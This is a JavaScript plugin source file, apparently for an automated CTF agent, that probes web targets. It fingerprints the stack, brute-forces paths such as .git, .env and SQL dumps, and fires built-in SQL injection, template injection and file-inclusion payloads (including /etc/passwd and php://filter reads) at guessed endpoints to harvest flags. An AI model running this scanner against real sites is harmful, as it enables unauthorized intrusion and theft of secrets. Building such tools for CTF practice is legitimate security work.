//#region lib/index.js
/**
 * dsh-web-expert — Web 专项专家插件（Web expert agent plugin）。
 *
 * 认领 planner 派发的 phase 属于 recon / audit(analysis) / exploit 的 web 类
 * 子任务（plan.category === "web"），按内置阶段流程执行：
 *   recon   → 站点基础信息探测（指纹/响应头/标题/常见信息文件）
 *   audit   → 内置字典目录爆破 + 备份文件/源码泄露审计
 *   exploit → 内置 SQLi / LFI / SSTI 基础 payload 集合对注入点尝试
 * 执行产出经 ctx.blackboard 写入：
 *   clues/<planId>:<taskId>:notes      中间线索（指纹/发现/利用结论）
 *   tool_outputs/<planId>:<taskId>     工具原始回显（请求行/状态/响应摘要）
 *   candidate_flags（经 ctx.planner.submitFlag）识别到的 flag → verifier 自动校验
 *   failures/<planId>:<taskId>         网络超时/连接拒绝/利用失败详情
 * 并通过 ctx.planner.completeTask / failTask 回报子任务状态。
 *
 * 运行约束：
 *   - 离线优先：目录字典、payload 集合、指纹启发规则全部固化在本源码，
 *     运行阶段不访问 GitHub、不下载远程 payload/规则库；
 *   - 独立 HTTP 客户端：基于 node:http/https，显式不读取
 *     HTTP_PROXY/HTTPS_PROXY/ALL_PROXY，本地回环与进程间通信绝不走代理；
 *   - 硬性依赖 inject: ["blackboard", "planner"]；
 *   - 全部持久化复用 blackboard 服务，禁止直接读写磁盘 JSON 文件。
 *
 * 重启断点恢复：启动时扫描 blackboard 中 category=web 且任务状态 running
 * 的子任务——若本插件曾认领（webExpert/tasks/<planId>:<taskId> 存在且
 * running）则标记 interrupt（写入 failures）并重新调度执行。
 *
 * @module @dsh-external/dsh-web-expert
 */
import { Service } from "@deepseek-ai/cordis";
import z from "@deepseek-ai/schemastery";
import http from "node:http";
import https from "node:https";

/** 默认 web 专家状态分区名。 */
const DEFAULT_SECTION = "webExpert";
/** blackboard 分区名规则（与 blackboard 插件一致）。 */
const SECTION_RE = /^[A-Za-z0-9][A-Za-z0-9_.-]{0,63}$/;
/** web 专家可执行的子任务阶段（audit 与 planner 的 analysis 同义）。 */
const WEB_TASK_PHASES = ["recon", "audit", "analysis", "exploit"];
/** 任务运行状态机。 */
const TASK_RUN_STATUSES = ["running", "done", "failed", "cancelled", "interrupted"];

/**
 * 多前缀 flag 提取正则（与 verifier 的校验集合一致：
 * CTF{} / flag{} / picoCTF{} / HTB{}，参考 ctf-agent-workstation ctfgrep
 * 默认前缀）。提取用非锚定；校验锚定由 verifier 负责。
 */
const FLAG_EXTRACTION_RE = /(?:ctf|flag|picoctf|htb)\{[^}\s]{1,200}\}/gi;

/** 内置目录爆破字典（离线固化；前 maxDirProbe 个参与爆破）。 */
const DIR_DICTIONARY = [
	"/robots.txt", "/sitemap.xml", "/admin", "/login", "/api", "/api/v1",
	"/backup", "/bak", "/old", "/test", "/dev", "/debug", "/console",
	"/phpinfo.php", "/info.php", "/server-status", "/server-info",
	"/.git/HEAD", "/.git/config", "/.env", "/.svn/entries", "/.DS_Store",
	"/.htaccess", "/.htpasswd", "/wp-config.php.bak", "/config.php.bak",
	"/app.py", "/main.py", "/server.js", "/app.js", "/index.php.bak",
	"/flag", "/flag.txt", "/flag.php", "/secret", "/secret/flag.txt",
	"/upload", "/uploads", "/static", "/files", "/download", "/source",
	"/src", "/www.zip", "/backup.zip", "/site.zip", "/db.sql", "/dump.sql",
	"/database.sql", "/data.sql", "/README.md", "/package.json",
	"/composer.json", "/requirements.txt", "/Dockerfile", "/docker-compose.yml",
	"/config.json", "/config.yaml", "/settings.py", "/config.py", "/web.config"
];

/** 备份/源码泄露特征路径（专项审计，与字典部分重叠但独立成组便于报告）。 */
const LEAK_PATHS = [
	"/.git/HEAD", "/.git/config", "/.env", "/.svn/entries", "/.DS_Store",
	"/index.php.bak", "/index.php~", "/index.php.swp", "/index.php.old",
	"/config.php.bak", "/config.php~", "/config.php.swp",
	"/app.py.bak", "/main.py.bak", "/server.js.bak", "/app.js.bak",
	"/backup.zip", "/www.zip", "/site.zip", "/db.sql", "/dump.sql",
	"/README.md", "/package.json", "/Dockerfile", "/docker-compose.yml",
	"/.htaccess", "/.htpasswd"
];

/** 内置 SQL 注入基础 payload 集合。 */
const SQLI_PAYLOADS = [
	"'",
	"''",
	"' OR '1'='1",
	"' OR 1=1-- -",
	"' OR 1=1#",
	"\" OR \"1\"=\"1",
	"' OR '1'='1' --",
	"' UNION SELECT NULL-- -",
	"' UNION SELECT 1,2,3-- -",
	"' AND SLEEP(0)-- -",
	"1' AND '1'='1",
	"1' AND '1'='2"
];

/** 内置 SSTI 基础 payload 集合（payload + 期望回显特征）。 */
const SSTI_PAYLOADS = [
	{ payload: "{{7*7}}", expect: /(^|[^0-9])49([^0-9]|$)/ },
	{ payload: "{{7*'7'}}", expect: /7777777/ },
	{ payload: "${7*7}", expect: /(^|[^0-9])49([^0-9]|$)/ },
	{ payload: "#{7*7}", expect: /(^|[^0-9])49([^0-9]|$)/ },
	{ payload: "<%= 7*7 %>", expect: /(^|[^0-9])49([^0-9]|$)/ },
	{ payload: "{{config}}", expect: /(SECRET_KEY|secret_key|AppConfig|FlaskConfig|class Config)/ },
	{ payload: "${7*7} ${class.getClass()}", expect: /(^|[^0-9])49([^0-9]|$)/ }
];

/** 内置文件包含（LFI）基础 payload 集合。 */
const LFI_PAYLOADS = [
	"../../../../etc/passwd",
	"../../../../../../etc/passwd",
	"....//....//....//etc/passwd",
	"..%2f..%2f..%2f..%2fetc%2fpasswd",
	"php://filter/convert.base64-encode/resource=index.php",
	"php://filter/convert.base64-encode/resource=config.php",
	"/etc/passwd"
];

/** 响应头 → 技术栈指纹规则。 */
const HEADER_FINGERPRINTS = [
	{ re: /^PHP\//i, tech: "PHP" },
	{ re: /^Werkzeug\//i, tech: "Python Flask (Werkzeug)" },
	{ re: /^gunicorn/i, tech: "Python Gunicorn" },
	{ re: /^nginx/i, tech: "Nginx" },
	{ re: /^Apache/i, tech: "Apache" },
	{ re: /^Microsoft-IIS/i, tech: "IIS" },
	{ re: /^Jetty/i, tech: "Jetty" },
	{ re: /^Tomcat/i, tech: "Tomcat" },
	{ re: /^Express/i, tech: "Node.js Express" },
	{ re: /^openresty/i, tech: "OpenResty" },
	{ re: /^Caddy/i, tech: "Caddy" }
];

/** Set-Cookie → 技术栈指纹规则。 */
const COOKIE_FINGERPRINTS = [
	{ re: /PHPSESSID/i, tech: "PHP" },
	{ re: /JSESSIONID/i, tech: "Java (JSP/Servlet)" },
	{ re: /connect\.sid/i, tech: "Node.js Express" },
	{ re: /laravel_session/i, tech: "Laravel (PHP)" },
	{ re: /csrftoken/i, tech: "Django (Python)" },
	{ re: /sessionid/i, tech: "Django/通用 Python" },
	{ re: /ASP\.NET_SessionId/i, tech: "ASP.NET" },
	{ re: /flask/i, tech: "Python Flask" }
];

/** 响应体 → 框架/应用指纹规则。 */
const BODY_FINGERPRINTS = [
	{ re: /wp-content|wp-includes|WordPress/i, tech: "WordPress" },
	{ re: /csrfmiddlewaretoken/i, tech: "Django (Python)" },
	{ re: /ThinkPHP|thinkphp/i, tech: "ThinkPHP (PHP)" },
	{ re: /Spring Boot|Whitelabel Error Page/i, tech: "Spring Boot (Java)" },
	{ re: /Laravel|laravel/i, tech: "Laravel (PHP)" },
	{ re: /Werkzeug Debugger/i, tech: "Flask Debugger 开启（危险）" },
	{ re: /Powered by Discuz/i, tech: "Discuz! (PHP)" },
	{ re: /generator" content="[^"]*[Jj]ekyll/i, tech: "Jekyll" },
	{ re: /Vue\.js|vue\.js/i, tech: "Vue.js SPA" },
	{ re: /React|react/i, tech: "React SPA" },
	{ re: /jQuery v?[\d.]+/i, tech: "jQuery" },
	{ re: /Bootstrap v?[\d.]+/i, tech: "Bootstrap" }
];

/** SQL 报错/注入成功特征（响应体）。 */
const SQL_ERROR_SIGNATURES = [
	/sql syntax|syntax error/i,
	/mysql|mariadb|postgresql|sqlite/i,
	/ORA-\d{5}/i,
	/you have an error in your SQL/i,
	/warning:.*mysql|mysql_fetch/i,
	/unclosed quotation mark/i,
	/Microsoft OLE DB|Incorrect syntax near/i
];

/**
 * 内置 exploit 端点启发表：{ path, params: [[参数名, 攻击类型]...] }。
 * 第一轮用探针 payload 命中后，第二轮对同 (端点, 参数, 攻击) 跑完整 payload。
 */
const EXPLOIT_ENDPOINTS = [
	{ path: "", params: [["id", "sqli"], ["name", "ssti"], ["file", "lfi"]] },
	{ path: "/debug", params: [["name", "ssti"], ["id", "sqli"]] },
	{ path: "/search", params: [["id", "sqli"], ["q", "sqli"]] },
	{ path: "/download", params: [["file", "lfi"]] },
	{ path: "/view", params: [["file", "lfi"]] },
	{ path: "/page", params: [["file", "lfi"]] },
	{ path: "/file", params: [["file", "lfi"]] },
	{ path: "/read", params: [["file", "lfi"]] },
	{ path: "/include", params: [["file", "lfi"]] },
	{ path: "/index.php", params: [["id", "sqli"], ["file", "lfi"]] },
	{ path: "/api/search", params: [["q", "sqli"]] },
	{ path: "/show", params: [["id", "sqli"], ["file", "lfi"]] },
	{ path: "/greet", params: [["name", "ssti"]] },
	{ path: "/hello", params: [["name", "ssti"]] },
	{ path: "/name", params: [["name", "ssti"]] },
	{ path: "/template", params: [["name", "ssti"]] },
	{ path: "/get", params: [["file", "lfi"]] },
	{ path: "/fetch", params: [["file", "lfi"]] },
	{ path: "/source", params: [["file", "lfi"]] }
];

/** 探针 payload（第一轮快速命中判定）。 */
const EXPLOIT_PROBES = {
	sqli: { payload: "'", detect: (text) => SQL_ERROR_SIGNATURES.some((re) => re.test(text)) },
	ssti: { payload: "{{7*7}}", detect: (text) => /(^|[^0-9])49([^0-9]|$)/.test(text) },
	lfi: { payload: "../../../../etc/passwd", detect: (text) => /root:.*:0:0:/m.test(text) || /etc\/passwd/.test(text) }
};

/** 当前 UTC 时间 ISO-8601。 */
function nowIso() {
	return new Date().toISOString();
}

/** 普通对象判断。 */
function isPlainObject(value) {
	return typeof value === "object" && value !== null && !Array.isArray(value);
}

/** 从挑战上下文（url / description / attachments）解析目标 URL。 */
function extractTargetUrl(challenge) {
	if (challenge?.url && typeof challenge.url === "string" && /^https?:\/\//i.test(challenge.url.trim())) {
		return challenge.url.trim();
	}
	const text = [
		challenge?.description ?? "",
		...(Array.isArray(challenge?.attachments) ? challenge.attachments.map((a) => `${a.name ?? ""} ${a.note ?? ""}`) : [])
	].join("\n");
	const match = text.match(/https?:\/\/[^\s"'<>（）)\]]+/i);
	return match?.[0] ?? void 0;
}

/** 请求头对象 → 小写键映射（便于指纹匹配）。 */
function normalizeHeaders(headers) {
	const out = {};
	for (const [key, value] of Object.entries(headers ?? {})) out[String(key).toLowerCase()] = String(value);
	return out;
}

//#region 迷你 HTTP 客户端（独立配置，不走代理）
/**
 * 一次性 HTTP(S) 请求：node:http/https 直连，显式不读取
 * HTTP_PROXY/HTTPS_PROXY/ALL_PROXY，本地回环/进程间通信绝不走代理。
 * 支持超时、手动重定向、响应大小上限；只允许 http/https 协议。
 * @returns `{ status, headers, text, finalUrl }`。
 * @throws Error（code=ETIMEDOUT/ECONNREFUSED/ENOTFOUND/EHOSTUNREACH/EBADRESP/ETOOBIG…）。
 */
function httpRequest(url, options) {
	return new Promise((resolve, reject) => {
		const { timeoutMs = 8000, maxRedirects = 3, maxResponseBytes = 262144, userAgent, method = "GET", headers = {}, body } = options ?? {};
		let parsed;
		try {
			parsed = new URL(url);
		} catch {
			reject(Object.assign(new Error(`invalid URL: ${url}`), { code: "EBADURL" }));
			return;
		}
		if (parsed.protocol !== "http:" && parsed.protocol !== "https:") {
			reject(Object.assign(new Error(`unsupported protocol ${parsed.protocol}`), { code: "EBADURL" }));
			return;
		}
		const lib = parsed.protocol === "https:" ? https : http;
		const reqHeaders = {
			"User-Agent": userAgent ?? "dsh-web-expert/0.1",
			"Accept": "*/*",
			...(parsed.hostname === "127.0.0.1" || parsed.hostname === "localhost" ? { "Host": parsed.host } : {}),
			...headers
		};
		const req = lib.request(parsed, {
			method,
			headers: reqHeaders,
			// 不设置任何 proxy/agent：默认直接连接（系统代理 env 一律不读）
		}, (res) => {
			let size = 0;
			const chunks = [];
			let aborted = false;
			res.on("data", (chunk) => {
				size += chunk.length;
				if (size > maxResponseBytes) {
					aborted = true;
					res.destroy();
					reject(Object.assign(new Error(`response exceeds ${maxResponseBytes} bytes`), { code: "ETOOBIG" }));
					return;
				}
				chunks.push(chunk);
			});
			res.on("end", () => {
				if (aborted) return;
				const text = Buffer.concat(chunks).toString("utf8");
				resolve({ status: res.statusCode ?? 0, headers: res.headers, text, finalUrl: url });
			});
			res.on("error", (error) => reject(Object.assign(error, { url })));
		});
		req.setTimeout(timeoutMs, () => {
			req.destroy(Object.assign(new Error(`request timeout after ${timeoutMs}ms`), { code: "ETIMEDOUT", url }));
		});
		req.on("error", (error) => reject(Object.assign(error, { url })));
		if (body !== void 0) req.write(typeof body === "string" ? body : JSON.stringify(body));
		req.end();
	}).then(async (result) => {
		// 手动跟随重定向
		const location = result.headers?.location;
		if (location && [301, 302, 303, 307, 308].includes(result.status) && maxRedirects > 0) {
			const next = new URL(location, result.finalUrl).href;
			return httpRequest(next, { ...(options ?? {}), maxRedirects: maxRedirects - 1 });
		}
		return result;
	});
}

/** 并发池：限制同时进行的请求数（CANCELLED 必须中止整个任务）。 */
async function mapWithConcurrency(items, limit, worker) {
	const results = new Array(items.length);
	let next = 0;
	async function run() {
		while (true) {
			const index = next++;
			if (index >= items.length) return;
			try {
				results[index] = await worker(items[index], index);
			} catch (error) {
				if (error?.code === "CANCELLED") throw error;
				results[index] = { error };
			}
		}
	}
	const workers = Array.from({ length: Math.max(1, Math.min(limit, items.length)) }, () => run());
	await Promise.all(workers);
	return results;
}
//#endregion

/**
 * Web 专家服务。注册为 `ctx.webExpert`。
 * 硬性依赖 inject: ["blackboard", "planner"]。
 */
class WebExpertService extends Service {
	/** 服务名。 */
	static provide = "webExpert";
	/** 必需服务。 */
	static inject = ["blackboard", "planner"];
	/** 插件配置 schema。 */
	static Config = z.object({
		section: z.string().default(DEFAULT_SECTION),
		autoClaim: z.boolean().default(true),
		timeoutMs: z.number().min(100).default(8000),
		maxRedirects: z.number().min(0).default(3),
		maxResponseBytes: z.number().min(1024).default(262144),
		maxDirProbe: z.number().min(1).default(40),
		concurrentRequests: z.number().min(1).default(4),
		userAgent: z.string().default("dsh-web-expert/0.1 (offline CTF agent)"),
		resumeOnStart: z.boolean().default(true)
	});

	/** 已校验配置。 */
	config;
	/** webExpert 分区名。 */
	section;
	/** blackboard 服务（injected）。 */
	blackboard;
	/** planner 服务（injected）。 */
	planner;
	/** 本进程内正在执行的任务（planId:taskId → 取消标志），防止跨实例误判。 */
	runningLocal = new Map();
	/** dispose 标记。 */
	closed = false;

	constructor(ctx, config) {
		super(ctx, "webExpert");
		this.config = config;
		if (!SECTION_RE.test(config.section)) {
			throw new TypeError(`webExpert: invalid blackboard section ${JSON.stringify(config.section)}`);
		}
		this.section = config.section;
		this.blackboard = ctx.blackboard;
		this.planner = ctx.planner;
	}

	/**
	 * 生命周期：监听派发/取消/planner 认领事件；等 blackboard 就绪后执行
	 * 重启断点恢复（扫描 running 的 web 子任务）。
	 */
	async *[Service.init]() {
		yield async () => {
			this.closed = true;
			this.runningLocal.clear();
		};
		this.ctx.on("web-expert/execute-task", (payload) => {
			this.executeTask(payload).catch((error) => this._handleError("web-expert/execute-task", error));
		});
		this.ctx.on("web-expert/cancel-task", (payload) => {
			this.cancelTask(payload?.planId, payload?.taskId).catch((error) => this._handleError("web-expert/cancel-task", error));
		});
		if (this.config.autoClaim) {
			this.ctx.on("planner/task-update", (payload) => {
				if (payload?.status !== "running") return;
				this._maybeClaim(payload.planId, payload.taskId).catch((error) => this._handleError(`claim ${payload.planId}/${payload.taskId}`, error));
			});
		}
		await this.blackboard.waitReady();
		if (this.config.resumeOnStart) await this._resumeInterrupted();
		this.ctx.logger.info("webExpert: ready (section=%s, autoClaim=%s, offline rules=%d dirs/%d sqli/%d ssti/%d lfi)",
			this.section, this.config.autoClaim, DIR_DICTIONARY.length, SQLI_PAYLOADS.length, SSTI_PAYLOADS.length, LFI_PAYLOADS.length);
	}

	//#region 服务 API

	/**
	 * 执行一个 web 子任务。
	 * @param input - `{ planId, task, challenge?, options? }`：
	 *   task 为 planner 任务对象（至少含 id/phase）；challenge 为上下文
	 *   （url/description/attachments，缺省从 challenges/<planId> 读取）。
	 * @returns 执行结果。
	 */
	async executeTask(input) {
		await this.blackboard.waitReady();
		const { planId, task, challenge, options } = input ?? {};
		if (!planId || !task?.id) throw new TypeError("webExpert: executeTask requires { planId, task: { id, ... } }");
		const phase = String(task.phase ?? "").toLowerCase();
		if (!WEB_TASK_PHASES.includes(phase)) {
			throw new TypeError(`webExpert: 不支持的阶段 ${JSON.stringify(task.phase)}（支持 ${WEB_TASK_PHASES.join("/")}）`);
		}
		const key = this._taskKey(planId, task.id);
		if (this.runningLocal.get(key) === true) return this.getTaskState(planId, task.id);
		this.runningLocal.set(key, false);

		const ctx2 = await this._loadChallengeContext(planId, challenge);
		// 认领/状态记录
		await this._setTaskState(planId, task.id, {
			planId, taskId: task.id, phase, status: "running",
			title: task.title, progress: "claimed", startedAt: nowIso(), updatedAt: nowIso()
		});
		this.ctx.emit("web-expert/task-claimed", { planId, taskId: task.id, phase, at: nowIso() });

		try {
			const result = await this._execute(planId, task, ctx2, options ?? {});
			await this._setTaskState(planId, task.id, { status: "done", progress: "done", updatedAt: nowIso(), result });
			if (!this.closed) {
				this.ctx.emit("web-expert/task-done", { planId, taskId: task.id, phase, result, at: nowIso() });
			}
			// 回报 planner：任务完成
			try {
				await this.planner.completeTask(planId, task.id, { webExpert: true, phase, findings: result.findings, flag: result.flag, urls: result.urls }, { executor: "web-expert" });
			} catch (error) {
				this.ctx.logger.debug("webExpert: planner completeTask skipped for %s/%s: %s", planId, task.id, error?.message);
			}
			return result;
		} catch (error) {
			if (error?.code === "CANCELLED") {
				// 取消：状态置 cancelled（不写入失败记录，不 fail 计划任务）
				await this._setTaskState(planId, task.id, { status: "cancelled", progress: "cancelled", updatedAt: nowIso() });
				if (!this.closed) {
					this.ctx.emit("web-expert/task-fail", { planId, taskId: task.id, phase, error: { code: "CANCELLED", message: "任务被取消" }, reason: "cancelled", at: nowIso() });
				}
				return { phase, status: "cancelled", at: nowIso() };
			}
			const failed = await this._handleTaskError(planId, task, phase, error, ctx2);
			throw failed;
		} finally {
			this.runningLocal.delete(key);
		}
	}

	/** 取消一个正在执行的任务（步骤边界生效）。 */
	async cancelTask(planId, taskId) {
		await this.blackboard.waitReady();
		if (!planId || !taskId) throw new TypeError("webExpert: cancelTask requires planId and taskId");
		const key = this._taskKey(planId, taskId);
		this.runningLocal.set(key, true);
		const state = await this.getTaskState(planId, taskId);
		if (state && state.status === "running") {
			await this._setTaskState(planId, taskId, { status: "cancelled", progress: "cancelled", updatedAt: nowIso() });
			await this.blackboard.append("failures", `${planId}:${taskId}`, {
				planId, taskId, type: "web-expert-cancelled", message: "任务被取消", at: nowIso()
			});
			if (!this.closed) this.ctx.emit("web-expert/task-fail", { planId, taskId, phase: state.phase, error: { code: "CANCELLED", message: "任务被取消" }, reason: "cancelled", at: nowIso() });
		}
		return { planId, taskId, cancelled: true, at: nowIso() };
	}

	/** 读取任务运行状态（webExpert/tasks/<planId>:<taskId>）。 */
	async getTaskState(planId, taskId) {
		await this.blackboard.waitReady();
		return this.blackboard.get(this.section, this._taskKey(planId, taskId));
	}

	/** 列出全部（本插件记录的）web 任务运行状态。 */
	async listTasks() {
		await this.blackboard.waitReady();
		const keys = await this.blackboard.keys(this.section);
		const out = [];
		for (const key of keys) {
			if (!key.startsWith("tasks/")) continue;
			const state = await this.blackboard.get(this.section, key);
			if (state) out.push(state);
		}
		return out;
	}

	/** 底层封装：对单个 URL 发起探测（服务 API 复用/测试）。 */
	async probeUrl(url, options = {}) {
		await this.blackboard.waitReady();
		return httpRequest(url, {
			timeoutMs: options.timeoutMs ?? this.config.timeoutMs,
			maxRedirects: options.maxRedirects ?? this.config.maxRedirects,
			maxResponseBytes: options.maxResponseBytes ?? this.config.maxResponseBytes,
			userAgent: this.config.userAgent,
			method: options.method,
			headers: options.headers,
			body: options.body
		});
	}

	//#endregion

	//#region 认领与派发

	/** planner 把任务置 running 时自动认领（plan.category === "web" 且阶段匹配）。 */
	async _maybeClaim(planId, taskId) {
		if (this.closed || !this.config.autoClaim) return;
		const plan = await this.planner.getPlan(planId);
		if (!plan || plan.category !== "web") return;
		const task = plan.tasks?.find((t) => t.id === taskId);
		if (!task) return;
		const phase = String(task.phase ?? "").toLowerCase();
		if (!WEB_TASK_PHASES.includes(phase)) return;
		const state = await this.getTaskState(planId, taskId);
		if (state?.status === "running") return; // 已在执行
		const challenge = await this.blackboard.get("challenges", planId);
		await this.executeTask({ planId, task, challenge: challenge ?? { description: plan.description, attachments: plan.attachments, url: plan.meta?.url } });
	}

	//#endregion

	//#region 执行引擎

	/** 加载挑战上下文：显式传入优先，否则从 blackboard challenges/<planId> 读取。 */
	async _loadChallengeContext(planId, explicit) {
		if (isPlainObject(explicit)) return explicit;
		const stored = await this.blackboard.get("challenges", planId);
		if (isPlainObject(stored)) return stored;
		const plan = await this.planner.getPlan(planId);
		return { description: plan?.description ?? "", attachments: plan?.attachments ?? [], category: plan?.category };
	}

	/** 按阶段分发执行。 */
	async _execute(planId, task, challenge, options) {
		const phase = String(task.phase).toLowerCase();
		const target = extractTargetUrl(challenge);
		if (!target) {
			throw Object.assign(new Error("未在挑战上下文中找到目标 URL（url/description/attachments）"), { code: "EURL" });
		}
		this._emitProgress(planId, task, `目标 ${target}`);
		if (phase === "recon") return this._runRecon(planId, task, target);
		if (phase === "audit" || phase === "analysis") return this._runAudit(planId, task, target);
		return this._runExploit(planId, task, target);
	}

	/** recon：站点基础信息探测。 */
	async _runRecon(planId, task, target) {
		const findings = [];
		const urls = [target];
		await this._emitProgress(planId, task, "recon: 请求首页");
		const home = await this._request(planId, task, target);
		await this._tool(planId, task.id, `GET ${target} -> ${home.status}`);
		const headers = normalizeHeaders(home.headers);
		const fingerprint = [];
		for (const [key, value] of Object.entries(headers)) {
			for (const rule of HEADER_FINGERPRINTS) {
				if (rule.re.test(value)) fingerprint.push(`${rule.tech}（${key}: ${value.slice(0, 60)}）`);
			}
		}
		for (const rule of COOKIE_FINGERPRINTS) {
			const cookie = headers["set-cookie"];
			if (cookie && rule.re.test(cookie)) fingerprint.push(`${rule.tech}（Set-Cookie 特征）`);
		}
		for (const rule of BODY_FINGERPRINTS) {
			if (rule.re.test(home.text)) fingerprint.push(rule.tech);
		}
		const title = home.text.match(/<title[^>]*>([^<]{1,120})<\/title>/i)?.[1]?.trim();
		if (fingerprint.length) {
			findings.push({ kind: "fingerprint", detail: [...new Set(fingerprint)] });
			await this._clue(planId, task.id, `站点指纹: ${[...new Set(fingerprint)].join("; ")}`);
		} else {
			await this._clue(planId, task.id, `站点指纹: 未识别（status=${home.status}，Server=${headers["server"] ?? "?"}）`);
		}
		if (title) await this._clue(planId, task.id, `页面标题: ${title}`);
		await this._tool(planId, task.id, `[headers] server=${headers["server"] ?? "-"} x-powered-by=${headers["x-powered-by"] ?? "-"} set-cookie=${headers["set-cookie"] ?? "-"}`);

		// 常见信息文件
		for (const path of ["/robots.txt", "/sitemap.xml"]) {
			await this._checkCancel(planId, task.id);
			try {
				const r = await this._request(planId, task, new URL(path, target).href);
				urls.push(r.finalUrl);
				if (r.status === 200 && r.text.trim().length > 0) {
					await this._tool(planId, task.id, `GET ${path} -> ${r.status} (${r.text.trim().slice(0, 200).replace(/\n/g, " | ")})`);
					await this._clue(planId, task.id, `${path} 可访问（${r.text.trim().length} 字节）`);
					findings.push({ kind: "info-file", path, status: r.status });
					await this._extractFlags(planId, task.id, `${r.text} ${r.headers?.server ?? ""}`);
				}
			} catch (error) {
				await this._requestError(planId, task, "recon", path, error);
			}
		}
		await this._tool(planId, task.id, `[recon] 完成，指纹 ${findings.length} 项`);
		return { phase: "recon", status: "done", findings, urls, flag: null };
	}

	/** audit：内置字典目录爆破 + 备份/源码泄露审计。 */
	async _runAudit(planId, task, target) {
		const findings = [];
		const urls = [];
		const base = new URL(target);
		const candidates = [...new Set([...DIR_DICTIONARY, ...LEAK_PATHS])].slice(0, this.config.maxDirProbe);
		await this._emitProgress(planId, task, `audit: 目录爆破 ${candidates.length} 个路径`);
		const results = await mapWithConcurrency(candidates, this.config.concurrentRequests, async (path) => {
			await this._checkCancel(planId, task.id);
			const url = new URL(path.startsWith("/") ? path : `/${path}`, base).href;
			try {
				const r = await this._request(planId, task, url);
				return { path, url, status: r.status, size: r.text.length, snippet: r.text.trim().slice(0, 120), headers: r.headers };
			} catch (error) {
				return { path, url, error: error?.code ?? "ERR" };
			}
		});
		const interesting = results.filter((r) => r && !r.error && r.status >= 200 && r.status < 500 && r.status !== 404);
		for (const hit of interesting) {
			urls.push(hit.url);
			await this._tool(planId, task.id, `[dir] ${hit.path} -> ${hit.status} (${hit.size}B) ${JSON.stringify(hit.snippet)}`);
			const leak = LEAK_PATHS.includes(hit.path);
			await this._clue(planId, task.id, `发现 ${hit.path}（${hit.status}，${hit.size}B）${leak ? "（疑似备份/源码泄露）" : ""}`);
			findings.push({ kind: leak ? "leak" : "dir", path: hit.path, status: hit.status, size: hit.size, snippet: hit.snippet });
			await this._extractFlags(planId, task.id, `${hit.snippet} ${JSON.stringify(hit.headers ?? {})}`);
		}
		const errors = results.filter((r) => r?.error);
		for (const e of errors) {
			await this._tool(planId, task.id, `[dir] ${e.path} -> ${e.error}`);
		}
		await this._tool(planId, task.id, `[audit] 完成：${interesting.length}/${candidates.length} 个路径有响应（${errors.length} 个网络错误）`);
		if (findings.length === 0) await this._clue(planId, task.id, "目录爆破未发现额外路径（仅首页）");
		return { phase: "audit", status: "done", findings, urls, flag: null };
	}

	/** exploit：SQLi / LFI / SSTI payload 集合对注入点尝试。 */
	async _runExploit(planId, task, target) {
		const findings = [];
		const urls = [];
		const base = new URL(target);
		const originPath = base.origin + (base.pathname === "/" ? "" : base.pathname);
		// 目标自带参数优先参与注入（追加到根端点）
		const ownParams = [...(base.searchParams?.keys?.() ?? [])].slice(0, 3);

		// 组装注入候选：内置端点启发表 + 目标自带参数
		const candidates = [];
		for (const ep of EXPLOIT_ENDPOINTS) {
			const epUrl = originPath + ep.path;
			const params = ownParams.length > 0 && ep.path === ""
				? ownParams.map((name) => [name, this._suggestAttack(name)])
				: ep.params;
			for (const [name, attack] of params) {
				if (attack) candidates.push({ url: epUrl, param: name, attack });
			}
		}
		await this._emitProgress(planId, task, `exploit: ${candidates.length} 个 (端点×参数×攻击) 探针候选`);

		// 第一轮：探针 payload 快速命中
		const confirmed = [];
		for (const cand of candidates) {
			await this._checkCancel(planId, task.id);
			const probe = EXPLOIT_PROBES[cand.attack];
			const u = new URL(cand.url);
			u.searchParams.set(cand.param, probe.payload);
			try {
				const r = await this._request(planId, task, u.href);
				urls.push(u.href);
				// SQLi 报错常返回 500，故 sqli 探针接受 200/500；SSTI/LFI 仅接受 200
				const statusOk = cand.attack === "sqli" ? (r.status === 200 || r.status === 500) : r.status === 200;
				if (statusOk && probe.detect(r.text)) {
					confirmed.push(cand);
					await this._tool(planId, task.id, `[probe] ${cand.attack} ${cand.param} @ ${cand.url} -> 探针命中`);
				}
			} catch (error) {
				await this._requestError(planId, task, "exploit-probe", `${cand.url} ${cand.param}`, error);
			}
		}

		if (confirmed.length === 0) {
			throw Object.assign(new Error("exploit：内置 payload 集合未命中（SQLi/LFI/SSTI）"), { code: "ENOHIT" });
		}

		// 第二轮：对命中点跑完整 payload 集合确认
		for (const cand of confirmed) {
			const payloads = cand.attack === "sqli"
				? SQLI_PAYLOADS.map((p) => ({ payload: p, expect: null }))
				: cand.attack === "lfi"
					? LFI_PAYLOADS.map((p) => ({ payload: p, expect: null }))
					: SSTI_PAYLOADS;
			for (const { payload, expect } of payloads) {
				await this._checkCancel(planId, task.id);
				const u = new URL(cand.url);
				u.searchParams.set(cand.param, payload);
				try {
					const r = await this._request(planId, task, u.href);
					urls.push(u.href);
					const hit = expect === null
						? (cand.attack === "sqli" ? SQL_ERROR_SIGNATURES.some((re) => re.test(r.text)) : (r.status === 200 && (/root:.*:0:0:/m.test(r.text) || /etc\/passwd/m.test(r.text) || /^[A-Za-z0-9+/]{40,}={0,2}$/m.test(r.text.trim()))))
						: (r.status === 200 && expect.test(r.text));
					if (hit) {
						const label = cand.attack.toUpperCase();
						await this._tool(planId, task.id, `[${label.toLowerCase()}] ${cand.param}=${payload} @ ${cand.url} -> 命中（status=${r.status}）: ${r.text.trim().slice(0, 200).replace(/\n/g, " ")}`);
						await this._clue(planId, task.id, `${label} 注入疑似存在：端点 ${cand.url}，参数 ${cand.param}，payload ${payload}`);
						findings.push({ kind: cand.attack, url: cand.url, param: cand.param, payload, status: r.status });
						await this._extractFlags(planId, task.id, r.text);
					}
				} catch (error) {
					await this._requestError(planId, task, `exploit-${cand.attack}`, `${cand.url} ${cand.param}=${payload}`, error);
				}
			}
		}

		if (findings.length === 0) {
			throw Object.assign(new Error("exploit：探针命中但完整 payload 未确认（SQLi/LFI/SSTI）"), { code: "ENOHIT" });
		}
		await this._tool(planId, task.id, `[exploit] 完成：命中 ${findings.length} 处`);
		return { phase: "exploit", status: "done", findings, urls, flag: null };
	}

	/** 内置启发：参数名 → 建议攻击类型。 */
	_suggestAttack(param) {
		const p = String(param).toLowerCase();
		if (/id|q|search|keyword|user|username|pass|password|type|cat|no/.test(p)) return "sqli";
		if (/name|template|greet|hello|message|input|content/.test(p)) return "ssti";
		if (/file|page|path|download|read|include|view|show|get|fetch|source|doc/.test(p)) return "lfi";
		return null;
	}

	//#endregion

	//#region 产出与异常

